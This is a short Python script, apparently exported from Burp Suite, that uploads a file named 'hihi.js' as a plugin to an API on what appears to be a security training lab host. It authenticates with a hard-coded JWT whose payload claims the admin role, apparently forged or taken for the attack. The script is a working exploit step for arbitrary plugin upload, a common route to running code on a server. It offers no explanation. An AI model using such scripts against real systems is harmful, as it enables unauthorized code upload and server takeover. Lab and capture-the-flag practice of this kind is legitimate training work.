import requests

burp0_url = "https://musoe.cyberjutsu-lab.tech/api/v1/plugins"
burp0_headers = {"X-Access-Token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MiwidXNlcm5hbWUiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.i2QfXZ1kzH51RglyeDbinlhcvilrA6yYs6cdff7tr7Y"}

plugin_path = "hihi.js"
file_name = "hihi.js"
with open(plugin_path, "rb") as f:
    file_data = {
        "plugin":(file_name, f, "multipart/form-data")
    }
    result = requests.post(burp0_url, headers=burp0_headers,files=file_data)
    print(result.text)